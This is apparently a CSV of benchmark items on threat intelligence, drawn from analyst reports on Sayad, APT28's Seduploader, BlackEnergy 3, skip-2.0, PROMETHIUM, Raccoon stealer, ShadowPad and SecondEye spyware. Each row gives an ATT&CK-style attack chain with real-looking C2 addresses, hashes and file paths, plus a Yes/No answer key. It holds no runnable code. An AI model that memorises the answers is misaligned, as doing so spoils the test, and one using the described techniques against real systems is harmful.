Question ID,AttackSeq ID,Batch ID,Question,Context,Answer
1774,321,321-Credential Access-T1555-Credentials from Password Stores,"After ensuring persistence by modifying the registry to run at startup using rundll32.exe with the Client (DiagnosticsService.dll), is Sayad likely to perform discovery to collect host and application data before stealing credentials for FTP clients, VPN client user configuration files, and RDP and Putty accounts?","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",No
1867,335,335-Execution-T1059-Command and Scripting Interpreter,"After leveraging the malicious Word document to gain initial access using the DDE technique, is it likely that the APT28 threat actor will use Command and Scripting Interpreter to invoke PowerShell commands to download a file and create persistence through a batch file and registry entry before connecting to a command and control server to drop the first-stage Seduploader malware?","Initial Access: During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled.
Persistence: The document creates a batch file and a registry entry to ensure persistence of the malware on the victim's system.
Defense Evasion: APT28 is known for rapidly incorporating new exploitation techniques to increase its success, such as moving away from using VBA scripts employed in past actions and choosing to incorporate the DDE technique to bypass network defenses.
Command and Control: Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system. The control server domain associated with this activity is webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.
Others: APT28 has recently focused on using different themes. In this case, it capitalized on the recent terrorist attack in New York City. The document itself is blank. The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader. The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows. We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28. The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader(ab354807e687993fbeb1b325eb6e4ab38d428a1e). The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S. The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.",Yes
2009,351,351-Command and Control-T1071-Application Layer Protocol,"After adversaries conduct initial access by delivering phishing emails with weaponized MS Office attachments and employees enable macros to install BlackEnergy 3 malware, is it likely that the malware will establish a connection from the malicious implant to an attacker-controlled command and control (C2) server before enabling internal network reconnaissance and credential harvesting?","Reconnaissance: Step 1: Reconnaissance and Intelligence Gathering. Before the attack, adversaries likely begin open-source intelligence gathering and reconnaissance on potential targets. Location: External infrastructure Action: Active threat actor activity Timeline: May 2014 or earlier Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: Adversaries likely gather publicly available information on deployed systems and network architecture, and may also use active discovery methods such as scanning of perimeter devices, enumeration of devices, social media data collection and analysis for future targeting
Initial Access: Step 3: Deliver Remote Access Trojan (RAT) Adversaries initiate phishing campaign against electricity distributors. Step 4: Install RAT. Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Active threat actor activity Timeline: May 2014-June 2015e Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other IT services used in business operations. Exploitation method: Adversaries send targeted emails containing the modified MS Office files as attachments to users on targeted networks. Impact: RAT is delivered to targeted network, but not installed. Installation requires employees to actively grant permission to the embedded VBA scripts to execute.
Execution: Step 4: Adversaries install BlackEnergy 3 on each of the three targeted electricity distributors after employees open the weaponized MS Office email attachments and enable macros. Location: Corporate network Action: Employee-enabled malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: In a social engineering attack, employees are prompted to enable macros when opening the file attached to phishing email. Once macros are enabled, the VBA script places multiple malicious files on the workstation, unbeknown to the employee. Impact: Files placed on workstations within the corporate network can begin the communication process with external Command and Control (CC) servers.
Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Discovery: Step 8: Lateral Movement and Target Identification on Corporate Network Adversaries conduct internal reconnaissance on corporate network to discover potential targets and expand accessed. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Discovered systems, including networked uninterruptable power supply (UPS) devices, data center servers, a telephone communications server, and employee workstations Role in infrastructure: Internal reconnaissance efforts could potentially include all deployed devices on the corporate network. Exploitation method: Adversaries likely use a combination of valid user credentials and BlackEnergy 3 plugins developed to conduct network discovery. VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish remote connections to workstations and servers. Impact: Adversaries can enumerate the systems deployed across the network, identify targets, and begin preparations for final attack. Step 9: Lateral Movement and Target Identification on ICS network Adversaries use stolen credentials to access the control environment and conduct reconnaissance on deployed systems. Location: ICS network Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Discovered systems, including human machine interface (HMI) workstations, distributed management system (DMS) servers, UPS devices, 52 serial-to-Ethernet converters (Moxa UC 7408-LX-Plus, 53 IRZRUH2 3G54), remote terminal unit (RTU) devices (ABB RTU560 CMU-02), and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. UPS devices condition incoming power to downstream devices and provide temporary battery backup power. Serial-to-Ethernet converters convert serial data from field devices to digital packets, enabling communications with the control center. RTU devices function as a communication processor or a data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to interact directly with the client application for the DMS server via a VPN, and native remote access services to access employee workstations hosting HMI applications. This access likely enables adversaries to enumerate all networked devices within the control environment. Impact: Adversaries gain access to critical systems, enabling them to begin target selection and preparations for final attack.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes
334,144,144-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After executing the skip-2.0 backdoor using the SessionEnv service and potentially achieving persistence through DLL hijacking of the TSVIPSrv.DLL file, is the skip-2.0 backdoor likely to employ a VMProtected launcher for defense evasion?","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",No
1157,245,245-Collection-T1005-Data from Local System,"After evading detection by adding malware directories to the Windows Defender exclusions list using PowerShell commands, is it likely that PROMETHIUM will search for and exfiltrate Microsoft Office files and use a document search module to parse the hard drive for files with specific extensions during its collection phase?","Initial Access: The PROMETHIUM threat actor, active since 2012, has been using trojanized installation files of well-known applications such as Firefox, VPNpro, DriverPack, and 5kPlayer to gain initial access to victims' systems. These trojanized files install both the malware and the legitimate application, which helps to disguise the malicious activities. The group has targeted victims in Colombia, India, Canada, and Vietnam.
Execution: The execution of the PROMETHIUM malware involves the use of trojanized installers that deploy the malware alongside legitimate applications. The malware uses a service for persistence and executes a PowerShell command to reconfigure Windows Defender, adding exclusions for the malware's directories and preventing sample submission. The service executable's sole purpose is to launch the C2 contact module upon service startup.
Persistence: PROMETHIUM achieves persistence by creating a service that launches the C2 contact module upon service startup. The service name changes from package to package, and the dropped files are stored in a specific Temp folder pattern.
Defense Evasion: To evade detection, the PROMETHIUM malware performs checks for ESET or BitDefender antivirus before dropping the malware. If these antiviruses are installed, the malware will not be dropped. Additionally, the malware adds its directories to the Windows Defender exclusions list using a PowerShell command.
Command and Control: PROMETHIUM's C2 infrastructure includes around 30 new C2 domains identified by Cisco Talos. The domains are hardcoded into the malware, suggesting the use of a Builder tool to generate the binaries. The C2 servers communicate over HTTPS using self-signed certificates.
Exfiltration: The malware exfiltrates encoded archives containing documents to the C2 server. The archives are encoded using an unusual scheme and split into chunks if larger than a certain size before being sent.
Others: PROMETHIUM has been resilient over the years, continuing its activities despite being exposed multiple times. The group's campaigns have been clustered based on domain creation dates, with some campaigns overlapping and going back to 2018. The threat actor's focus has expanded from Europe and the Middle East to a global operation targeting organizations on most continents. The characteristics of the malware suggest that PROMETHIUM could be part of an enterprise service for hire operation. Cisco Talos provides various ways for customers to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and Snort Subscriber Rule Set.",Yes
1388,278,278-Defense Evasion-T1205-Traffic Signaling,"After collecting system and account information as well as crypto wallet data through the Execution phase, is it likely that Raccoon stealer will make network requests to a Telegram channel to receive encrypted addresses of C&C servers for bypassing blocking and ensuring Defense Evasion before communicating with these C&C servers using Telegram features in the Command and Control phase?","Initial Access: In the summer of 2020, Group-IB specialists discovered a malware distribution campaign exploiting Telegram's legitimate features to distribute Raccoon stealer. Attackers used Telegram channels to bypass blocking of active C&C servers. The campaign involved phishing pages created with the Mephistophilus phishing kit and mailings with attachments containing malicious macros.
Execution: The Raccoon stealer, once executed, collects system information, account data, bank card data, and autofill form details from browsers. It also scans for valid crypto wallets and gains access to configuration files. The Vidar stealer, another malware used in the campaign, collects data from browsers, bank card data, crypto wallet files, messages, and more.
Command and Control: The Raccoon stealer communicated with C&C servers using legitimate features of Telegram to avoid detection. The C&C servers were encrypted and distributed through the Telegram channel 'blintick'.
Others: The campaign was divided into four stages based on the tools used: First wave (February 19 to March 5, 2020), Second wave (March 13 to May 22, 2020), Third wave (June 29 to July 2, 2020), and Fourth wave (August 24 to September 12, 2020). Most domains related to the campaign were registered with two registrars: Cloud2m and Host Africa. The attackers also distributed samples of another stealer called Vidar using malicious macros and phishing pages. The domains used to store the code and collect stolen bank card data were registered during the second wave with the same registrars as the domains discovered while investigating the malicious campaign. The attackers experimented with various loaders, including Buer and Smoke loaders. The campaign's purpose was to steal payment and user data.",Yes
256,130,130-Persistence-T1543-Create or Modify System Process,"After ensuring the execution chain by sideloading a legitimate executable vulnerable to DLL hijacking and decrypting the ShadowPad payload in memory, is ShadowPad likely to establish a registry Run key for persistence after creating a new service for extended access?","Initial Access: The ShadowPad advanced modular remote access trojan (RAT) has been deployed by the Chinese government-sponsored BRONZE ATLAS threat group since at least 2017. Secureworks Counter Threat Unit (CTU) researchers discovered that ShadowPad payloads are deployed to a host either encrypted within a DLL loader or within a separate file alongside a DLL loader. These DLL loaders decrypt and execute ShadowPad in memory after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The majority of ShadowPad samples analyzed were two-file execution chains: an encrypted ShadowPad payload embedded in a DLL loader. ShadowPad DLL loaders are sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The DLL loader then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm specific to the malware version. CTU researchers identified ShadowPad execution chains involving a third file that contains the encrypted ShadowPad payload. These chains execute the legitimate executable (usually renamed), sideload the ShadowPad DLL loader, and load and decrypt the third file. CTU researchers observed threat actors using BDReinit.exe or Oleview.exe as initial files in the three-file ShadowPad execution chain. The third file in the BDReinit.exe execution chain is log.dll.dat; in the Oleview.exe execution chain, it is iviewers.dll.dat. CTU researchers have attributed campaigns using these execution chains to the Chinese BRONZE UNIVERSITY threat group, which has targeted transportation, natural resource, energy, and non-governmental organizations. Third-party researchers have also identified three-file ShadowPad execution chains that begin with consent.exe (followed by secur32.dll and secur32.dll.dat) and AppLaunch.exe (followed by mscoree.dll and mscoree.dll.dat). Additionally, CTU analysis revealed a sample that used AppLaunch.exe followed by mscoree.dll and mscoree.dll.mui.
Execution: ShadowPad is decrypted in memory using a custom decryption algorithm. CTU researchers have identified multiple ShadowPad versions based on these distinct algorithms. ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality. As part of the execution chain, ShadowPad copies the legitimate binary and sideloaded DLL to a subdirectory specific to each sample. Most analyzed samples were copied to a subdirectory under C:\ProgramData, C:\Users\<username>\Roaming, or C:\Program Files. In three-file execution chains, the third file (e.g., log.dll.dat, iviewers.dll.dat) is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software. As part of this process, an encrypted payload is usually saved to a registry key under HKLM\SOFTWARE\Classes\CLSID\{GUID}\<eight-character hexadecimal string>. After the initial setup the legitimate executable is launched as a Windows service. This service initiates the ShadowPad execution chain. The ShadowPad payload is injected into a child process of the service process that is specified in the ShadowPad configuration information.
Defense Evasion: ShadowPad samples from 2018 deviated from the typical two-file execution chain. Those samples, which used the filename TSVIPSrv.DLL, are placed in the Windows System32 directory and are loaded by the Windows SessionEnv Service, which is vulnerable to DLL hijacking. CTU researchers observed BRONZE ATLAS using this technique in 2021 to load other payloads via this filename, including Cobalt Strike. In three-file execution chains, the third file is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software.
Command and Control: ShadowPad samples sharing behavioral similarities such as injecting the decrypted ShadowPad payload into a newly launched target process and establishing persistence on a compromised host specified in the configuration settings. Figure 1 lists configuration information for a ShadowPad sample that reveals command and control (C2) details, the process injection target, and persistence via creation of a service and a registry Run key.
Others: ShadowPad gained notoriety in 2017 after it was deployed in software supply chain attacks involving CCleaner, NetSarang, and ASUS Live Update utility. These campaigns were attributed to the BRONZE ATLAS threat group. A 2017 Microsoft complaint and U.S. Department of Justice (DOJ) indictments unsealed in 2020 provide additional information on ShadowPad's connection to BRONZE ATLAS. The Microsoft complaint alleges that BRONZE ATLAS (also known as Barium) deployed ShadowPad in 2017 to steal intellectual property and personally identifiable information (PII). At the time, the malware was used only by BRONZE ATLAS. The DOJ indictments allege that Chinese nationals working for the Chengdu 404 network security company deployed ShadowPad in a global campaign attributed to BRONZE ATLAS. A related DOJ indictment revealed that these Chinese nationals collaborated with another Chinese national known by the handle 'Rose' (sometimes known as Withered Rose and Wicked Rose), using similar tactics, techniques, and procedures (TTPs) and sharing malware. The indictment describes this individual as a sophisticated threat actor who committed computer intrusion offenses targeting high-technology organizations globally. Campaigns linked to Rose were tracked as Barium. A third-party report claimed that Rose likely co-developed malware with an associate named 'whg,' who has been linked to the development of the PlugX malware. PlugX is used by multiple Chinese threat groups. Third-party researchers also identified string and code overlap between PlugX and ShadowPad. This overlap suggests close links between the ShadowPad and PlugX developers. ShadowPad may have been developed by an individual or group affiliated with BRONZE ATLAS. One possibility is that Chengdu 404 originally developed ShadowPad, as the individuals named in the DOJ indictments were allegedly involved with developing malware used in their campaigns. It is likely that only BRONZE ATLAS used ShadowPad until approximately 2019. Most of the ShadowPad DLL loader samples can be clustered based on compile timestamps, C2 infrastructure, payload versions, DLL loader code overlap, and likely victimology. CTU researchers identified multiple ShadowPad clusters used in campaigns since 2019 and attributed these clusters to distinct threat groups. These groups include BRONZE ATLAS and BRONZE UNIVERSITY, whose targeting suggests affiliation with the MSS. A third-party report suggests that BRONZE UNIVERSITY (referred to in the report as EarthLusca) may be operating near to Chengdu in China after operational security mistakes revealed China-based infrastructure. Other ShadowPad clusters appear to reflect targeting aligned with PLA theater command areas of responsibility. In late 2015, PRC leader Xi Jinping announced widespread reforms to the PLA that included the establishment of the Strategic Support Force (PLASSF or SSF). This new branch focuses on modernizing the PLA's capabilities in strategic frontiers of space, cyberspace, and the electromagnetic domain. The impact on the PLA's cyber espionage mission has been extensive. Many organizations responsible for cyber espionage and signals intelligence (SIGINT) associated with the Third Department of the PLA's General Staff Department (commonly known as 3PLA) have been absorbed into the SSF Network Systems Department (NSD). The SSF NSD is also believed to be responsible for a broad range of information warfare capabilities beyond cyber espionage, coordinating electronic countermeasures as well as offensive and defensive cyber projects. As part of the modernization, the PLA replaced its seven military regions with five theater commands: Eastern, Southern, Western, Northern, and Central. These theater commands orchestrate ground, naval, air, and conventional missile forces for military operations in their geographic area of responsibility. While the exact area of responsibility for each theater command is ambiguous, they are broadly responsible for specific threats within their respective regions. Prior to the PLA reforms, each military region maintained at least one Technical Reconnaissance Bureau (TRB) to handle SIGINT and cyber espionage activities focused on the military region's area of responsibility. The TRBs were distinct from the former 3PLA units that were located across China, but they may have been tasked by the 3PLA. The relationship between the TRBs and the theater commands is unclear. The TRBs may have been consolidated under the SSF NSD alongside former 3PLA units. It is also possible that they continue to target countries in their area of responsibility but under the command and control of the SSF NSD. CTU researchers grouped distinct ShadowPad activity clusters by targeted geographic regions. Clusters align with the documented area of responsibility for three of the theater commands: Northern, Southern, and Western. CTU researchers attribute some of the ShadowPad activity to Chinese threat groups that have been publicly linked to specific PLA units located in the corresponding theater commands: Northern Theater Command: CTU researchers linked ShadowPad activity to BRONZE HUNTLEY and BRONZE BUTLER, which are reportedly located in the Northern Theater Command. These threat groups deployed ShadowPad against targets in South Korea, Russia, Japan, and Mongolia. These regions align with the Northern Theater Command's focus. In 2021, CTU researchers observed malware and infrastructure overlap between the two threat groups, suggesting close collaboration. Western Theater Command: Some ShadowPad activity primarily targeted countries neighboring China's western border, such as India and Afghanistan. CTU researchers clustered this activity based on attacker-controlled infrastructure, ShadowPad DLL loader variants such as ICEKILLER, and contextual information from third-party sources. Third-party researchers linked some of these campaigns to an individual working on behalf of the Western Theater Command. CTU analysis did not reveal sufficient evidence to corroborate these claims, but the locations and victimology are consistent with threat actors operating on behalf of the Western Theater Command. Southern Theater Command: CTU researchers identified activity that used a specific ShadowPad version to target organizations in the South China Sea region. BRONZE GENEVA is likely responsible for part of this activity based on overlap between the C2 infrastructure for the Nebulae malware family associated with BRONZE GENEVA and a ShadowPad sample analyzed by CTU researchers. This attribution of ShadowPad campaigns to theater commands is based on the submitter's location for ShadowPad malware samples uploaded to the VirusTotal analysis service (potentially indicating the victim's country), the C2 domain names that appear to reference specific regions (e.g., cloudvn. info suggests Vietnam targeting), contextual information regarding the activity and victimology, and the absence of evidence that ShadowPad samples with the same attributes were deployed in other regions. Evidence available as of this publication suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands. The malware was likely developed by threat actors affiliated with BRONZE ATLAS and then shared with MSS and PLA threat groups around 2019. Given the range of groups leveraging ShadowPad, all organizations that are likely targets for Chinese threat groups should monitor for TTPs associated with this malware. Organizations with operations in or connections to geographic regions covered by the regional theater commands should specifically monitor for known TTPs associated with threat groups likely affiliated with the relevant theater command.",Yes
1926,341,341-Credential Access-T1555-Credentials from Password Stores,"Before querying Google Chrome's SQLite databases to log usernames and passwords during the credential access phase, is it likely that the spyware will collect and archive personal files, keylogging data, and clipboard content during the collection phase, and set up scheduled tasks to ensure persistence by running sysBus32.exe every 3 hours?","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",Yes
